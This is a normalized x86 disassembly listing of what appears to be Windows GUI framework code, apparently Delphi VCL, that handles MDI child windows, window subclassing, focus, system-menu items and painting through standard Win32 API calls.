mov edx ebx
call sub_3a7a33c
sub_3ac9068
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_3ac5330
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x271 ] 0x3
je r-xdata
mov eax [ ebx + 0x338 ]
test eax eax
je r-xdata
movzx eax [ ebx + 0x277 ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov eax ebx
call sub_3ac9c28
push eax
push 0x1
push 0x80
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
jmp r-xdata
mov eax [ ebx + 0x33c ]
call sub_3a6641c
mov edi eax
test edi edi
jl r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x2a0 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x0
lea eax [ ebx + 0x33c ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_3a665d0
add esp 0x4
test [ ebx + 0x1c ] 0x1
jne r-xdata
inc edi
xor esi esi
mov eax [ ebx + 0x338 ]
mov edx [ eax ]
call [ edx + 0x8 ]
inc edi
xor esi esi
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_3aaf4fc
push eax
mov eax ebx
call sub_3aaf540
push eax
mov eax ebx
call sub_3ab7c38
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_3a67f50
mov [ ebx + 0x29c ] eax
push ebx
push sub_3ac7564
call sub_3a84724
mov [ ebx + 0x2c0 ] eax
push 0xfffffffc
mov eax [ ebx + 0x29c ]
push eax
call GetWindowLongA
mov [ ebx + 0x2bc ] eax
mov eax [ ebx + 0x2c0 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x29c ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_3aa3b48
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowPos
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3ad0d70
call sub_3ad105c
test al al
je r-xdata
mov eax [ ebx + 0x1b4 ]
push eax
mov eax [ ebx + 0x33c ]
mov eax [ eax + esi * 8 ]
push eax
push 0xb049
mov eax [ ebx + 0x33c ]
mov eax [ eax + esi * 8 + 0x4 ]
push eax
call SendMessageA
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x338 ]
call sub_3a7a494
call sub_3ab472c
inc esi
dec edi
jne r-xdata
xor edx edx
mov eax ebx
call sub_3ad0e24
sub_3ac925a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_3ac9385
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_3ab402c
and [ ebx + 0x358 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
cmp [ eax + 0x29c ] 0x0
jne r-xdata
mov eax ebx
call sub_3acbf84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac938c
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call __imp_SendMessageA
mov [ ebx + 0x1b4 ] eax
or [ ebx + 0x358 ] 0x10
jmp r-xdata
sub_3ac9394
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp ebx [ esi ]
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_3aac5e0
test eax eax
jne r-xdata
push 0x4
push ebx
call GetWindow
cmp eax [ esi ]
jne r-xdata
push 0x0
movzx eax [ esi + 0x4 ]
push eax
push 0xb04a
push ebx
call __imp_SendMessageA
sub_3ac93d8
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab44a4
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
setne al
mov [ ebp - 0xc ] al
lea eax [ ebp - 0x10 ]
push eax
push sub_3ac9394
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebp - 0x4 ]
call sub_3ac84c4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
xor eax eax
push ebp
push sub_3ac94be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
mov edx [ ebp - 0x8 ]
call sub_3a7a494
mov edx eax
mov eax [ ebp - 0x14 ]
call sub_3a7a33c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
mov edx [ ebp - 0x8 ]
call sub_3a7a494
mov edx [ eax ]
call [ edx + 0xb0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
mov edx [ ebp - 0x8 ]
call sub_3a7a494
mov dl 0x1
call sub_3ab9120
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x32c ]
mov edx [ ebp - 0x8 ]
call sub_3a7a494
xor edx edx
call sub_3ab9120
sub_3ac950c
push ebx
mov ebx eax
test [ ebx + 0x358 ] 0x10
je r-xdata
mov eax ebx
call sub_3ab42a8
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x29c ]
push eax
call __imp_SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x29c ] eax
pop ebx
retn
sub_3ac9550
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x29c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab522c
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x29c ]
push eax
mov eax ebx
call sub_3ab7c38
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_3ab7c38
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_3ac95b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3ac9664
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x268 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac966b
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
test edi edi
je r-xdata
mov [ ebx + 0x268 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x276 ] 0x0
je r-xdata
cmp ebx edi
je r-xdata
mov eax ebx
mov si 0xffaf
call sub_3a6457c
mov eax ebx
call sub_3ac9988
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
mov dl 0x1
mov eax edi
call sub_3ac45f8
cmp ebx eax
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb6
call sub_3a6457c
test al al
jne r-xdata
sub_3ac9674
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x268 ]
mov eax esi
call sub_3ab390c
test al al
je r-xdata
mov edx [ edi + 0x26c ]
mov eax esi
call sub_3ab390c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_3ac95b4
mov eax [ esi + 0x30 ]
mov [ edi + 0x26c ] eax
sub_3ac96bc
push ebx
push esi
mov esi eax
movzx ebx [ esi + 0x276 ]
mov eax esi
call sub_3ac95b4
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
sub_3ac96e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x5 ] 0x0
inc [ rw-data ]
cmp [ edi + 0x298 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_3a7a630
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_3a7a510
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_3a7a630
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_3a7a510
jmp r-xdata
xor eax eax
mov [ edi + 0x268 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x268 ] eax
jmp r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_3ac995d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x26c ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x26c ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x26c ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_3ab7c38
mov dx 0xb000
call sub_3ac4368
test al al
jne r-xdata
call sub_3ab7c38
mov ebx eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax ebx
call sub_3ac4368
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac9964
mov eax [ ebp - 0x4 ]
movzx edx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_3a64ce0
jmp r-xdata
call sub_3a64ce0
jmp r-xdata
mov esi [ edi + 0x26c ]
test esi esi
je r-xdata
mov eax [ edi + 0x26c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_3ab390c
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ edi + 0x26c ]
call sub_3ab7c38
mov ebx eax
mov eax [ edi + 0x26c ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x26c ] eax
mov dx 0xb01b
mov eax ebx
call sub_3ac4368
test al al
jne r-xdata
jmp r-xdata
mov ebx [ esi + 0x30 ]
cmp ebx [ edi + 0x26c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_3ab0e78
mov eax [ edi + 0x2c4 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
call sub_3a64ce0
jmp r-xdata
mov esi ebx
mov [ edi + 0x26c ] esi
mov eax esi
call sub_3ab7c38
mov dx 0xb01a
call sub_3ac4368
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
call sub_3a64ce0
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_3ab0e78
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
sub_3ac9988
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x268 ]
test eax eax
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp [ ebx + 0x298 ] 0x0
jne r-xdata
mov esi ebx
cmp [ ebx + 0x298 ] 0x0
jne r-xdata
mov esi eax
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax esi
call sub_3ab0e78
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_3ab80fc
mov esi eax
test esi esi
jne r-xdata
mov eax esi
call sub_3ab7c38
push eax
call SetFocus
mov eax esi
call sub_3ab7c38
mov ebx eax
call GetFocus
cmp ebx eax
jne r-xdata
mov esi ebx
jmp r-xdata
sub_3ac9a00
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x276 ] bl
mov eax [ esi + 0x2c4 ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
movzx ecx bl
mov edx 0xb02b
call sub_3ab0e78
pop esi
pop ebx
retn
cmp [ esi + 0x268 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_3ac9ab4
mov eax esi
call sub_3ac9988
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_3ab80fc
mov edx eax
mov eax esi
call sub_3ac95b4
sub_3ac9a64
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x0
je r-xdata
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
cmp [ ebx + 0x268 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_3ac7e40
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x268 ]
call sub_3ab0e78
mov eax ebx
call sub_3ac7e40
mov edx esi
call sub_3ac9a64
sub_3ac9ab4
push esi
test [ eax + 0x358 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x290 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x277 ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x277 ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x290 ]
test dl dl
je r-xdata
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov edx esi
call sub_3aa8a04
mov edx esi
call sub_3aa89e8
jmp r-xdata
mov ecx [ eax + 0x290 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x290 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
sub_3ac9b5c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
sub_3ac9ba8
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x268 ]
mov eax 0xb000
call sub_3ac9b5c
cmp [ ebx + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_3ac9bd8
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x268 ]
mov eax 0xb001
call sub_3ac9b5c
cmp [ ebx + 0x2ea ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2ec ]
call [ ebx + 0x2e8 ]
sub_3ac9c44
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_3a89f78
xor edx edx
push ebp
push sub_3ac9e3f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
mov edx [ ebp - 0x8 ]
call sub_3a8a3c8
xor edx edx
push ebp
push sub_3ac9e1c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
push eax
call SaveDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_3ac9dcf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_3ad0d70
mov ebx eax
mov eax ebx
call sub_3ad105c
test al al
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
movzx eax [ eax + 0x8 ]
xor al 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac9dd6
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call RestoreDC
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov [ eax + 0x8 ] 0x0
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
jmp r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000002
call sub_3a89b20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
mov eax [ eax + 0x14 ]
mov dl 0x5
call sub_3a89c5c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_3a88d54
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_3a8a340
push eax
call SetBkColor
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_3a89f04
push 0x4
call GetStockObject
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_3a8a340
push eax
call FillRect
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
jne r-xdata
sub_3ac9dd6
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffa6
call sub_3a6457c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac9e23
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
xor edx edx
call sub_3a8a3c8
retn
sub_3ac9e4c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_3ac7e40
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_3ac7e74
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
movzx edx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd0
call sub_3a6457c
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
movzx edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_3ab6ed0
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_3ac7ec0
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
movzx edx [ esp + 0x4 ]
mov eax edi
mov si 0xffd0
call sub_3a6457c
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_3ac9ef0
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ab7c38
call sub_3ac4004
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_3ab7c38
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_3ac9c28
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_3ab7c38
push eax
call EndPaint
movzx eax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_3ab5ae8
movzx eax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_3ac9f6e
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_3ab8bd4
cmp [ ebx + 0x298 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x298 ]
mov edx [ eax ]
call [ edx + 0x2c ]
sub_3ac9f98
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x1a4 ]
call sub_3a89b74
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_3ac9ff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ab7c38
call sub_3ac4004
test eax eax
jne r-xdata
mov [ esi ] 0x27
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_3ab5ed8
pop esi
pop ebx
retn
sub_3aca040
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x271 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x270 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x277 ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ab7c38
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x271 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x270 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x270 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_3aca13c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x290 ]
mov eax [ ebp - 0x4 ]
call sub_3ac8260
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_3aca040
pop ecx
sub_3aca188
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ab1844
cmp [ ebx + 0x8f ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_3ab7c38
call sub_3ac4004
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_3ab7c38
push eax
call PostMessageA
cmp [ ebx + 0x276 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_3ab02fc
pop esi
pop ebx
retn
sub_3aca214
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_3ac84c4
mov ebp eax
mov eax [ edi + 0x32c ]
test eax eax
je r-xdata
cmp [ edi + 0x340 ] 0x0
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
test [ edi + 0x1c ] 0x8
jne r-xdata
mov eax [ edi + 0x340 ]
call sub_3ac84c4
mov edx edi
call sub_3a7a4f0
test eax eax
jge r-xdata
inc esi
xor ebx ebx
xor eax eax
mov [ edi + 0x344 ] eax
mov eax edi
mov si 0xffa8
call sub_3a6457c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ edi + 0x340 ]
call sub_3ac849c
mov edx edi
call sub_3a7a4f0
inc eax
jle r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ edi + 0x32c ]
call sub_3a7a494
mov edx eax
mov eax ebp
call sub_3a7a4f0
test eax eax
jge r-xdata
cmp [ edi + 0x290 ] 0x0
je r-xdata
